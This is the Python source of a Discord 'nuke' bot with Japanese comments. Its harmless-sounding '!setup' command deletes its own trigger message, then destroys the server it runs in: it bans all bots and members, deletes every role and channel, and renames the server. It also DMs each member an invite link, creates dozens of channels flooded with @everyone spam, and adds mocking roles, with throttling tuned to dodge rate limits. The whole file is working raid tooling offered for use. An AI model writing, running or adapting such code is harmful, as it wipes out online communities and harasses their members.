import discord
from discord.ext import commands
import asyncio
import random
import os
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("TOKEN")
PREFIX = "!"
DEFAULT_NEW_NAME = "ますまに共栄圏植民地"
INVITE_LINK = "https://discord.gg/tqNR7BsAsR"

intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.bans = True
intents.guilds = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

sem_global = asyncio.Semaphore(60)
sem_message = asyncio.Semaphore(100)
sem_dm = asyncio.Semaphore(15)

async def limited_global(coro):
    async with sem_global:
        try:
            await coro
        except:
            pass

async def limited_message(coro):
    async with sem_message:
        try:
            await coro
        except:
            pass

async def limited_dm(coro):
    async with sem_dm:
        try:
            await coro
        except:
            pass

async def send_dm(member):
    try:
        await member.send(INVITE_LINK)
    except:
        pass

async def core_nuke(guild, new_server_name=None):
    new_name = new_server_name or DEFAULT_NEW_NAME

    members = [m for m in guild.members if m != bot.user]
    non_bot_members = [m for m in members if not m.bot]

    print(f"破壊開始: {guild.name} 非BOT={len(non_bot_members)}")

    # 他のボットBAN
    await asyncio.gather(*(guild.ban(m, reason="", delete_message_days=0) for m in members if m.bot), return_exceptions=True)

    # DM
    await asyncio.gather(*[limited_dm(send_dm(m)) for m in non_bot_members], return_exceptions=True)

    # ロール削除（並行で速く）
    print("ロール削除開始...")
    await asyncio.gather(*(r.delete() for r in guild.roles if not r.is_default() and not r.managed), return_exceptions=True)
    print("ロール削除完了")

    # チャンネル削除（並行）
    await asyncio.gather(*(ch.delete() for ch in guild.channels), return_exceptions=True)

    # サーバー名変更
    await guild.edit(name=new_name)

    # 規模別調整
    member_count = len(non_bot_members)
    if member_count < 100:
        target_channels = 100
        target_roles = 80
        spam_sleep_min = 0.1
        spam_sleep_max = 0.25
        role_batch_sleep = 0.05
    elif member_count < 500:
        target_channels = 80
        target_roles = 60
        spam_sleep_min = 0.15
        spam_sleep_max = 0.35
        role_batch_sleep = 0.08
    else:
        target_channels = 50
        target_roles = 40
        spam_sleep_min = 0.25
        spam_sleep_max = 0.5
        role_batch_sleep = 0.12

    # チャンネル作成（並行バッチ）
    channels = []
    current = 0
    channel_names = ["ますまに共栄圏万歳", "ますまに共栄圏最強"]
    while len(channels) < target_channels:
        tasks = []
        for _ in range(40):
            if len(channels) >= target_channels:
                break
            current += 1
            name = channel_names[current % 2]
            tasks.append(guild.create_text_channel(name))
        batch = await asyncio.gather(*tasks, return_exceptions=True)
        channels += [c for c in batch if isinstance(c, discord.TextChannel)]
        await asyncio.sleep(0.08)

    # スパム開始 + BAN/ロール作成並行
    spam_messages = [
        f"@everyone {INVITE_LINK}",
        f"@everyone 来い {INVITE_LINK}"
    ]

    message_counters = {ch.id: 0 for ch in channels}
    active_channels = channels.copy()

    ban_task = asyncio.create_task(asyncio.gather(*(guild.ban(m, reason=new_name, delete_message_days=0) for m in non_bot_members), return_exceptions=True))

    # ロール作成（並行バッチで速く）
    role_create_task = asyncio.create_task(asyncio.gather(*(guild.create_role(
        name="ますまに共栄圏に荒らされましたｗｗｗ",
        color=discord.Color.random(),
        reason=""
    ) for _ in range(target_roles)), return_exceptions=True))

    while any(c < 100 for c in message_counters.values()):
        spam_tasks = []
        for ch in active_channels[:]:
            if message_counters[ch.id] >= 100:
                active_channels.remove(ch)
                continue

            spam_tasks.append(limited_message(ch.send(random.choice(spam_messages))))
            message_counters[ch.id] += 1

        await asyncio.gather(*spam_tasks, return_exceptions=True)
        await asyncio.sleep(random.uniform(spam_sleep_min, spam_sleep_max))

    await ban_task
    await role_create_task

    print("完了")

@bot.command(name="masumani", aliases=["setup"])
async def trigger(ctx, *, new_name: str = None):
    if not ctx.guild:
        return
    try:
        await ctx.message.delete()
    except:
        pass
    asyncio.create_task(core_nuke(ctx.guild, new_name))

@bot.event
async def on_ready():
    print(f"起動: {bot.user}")

bot.run(TOKEN)
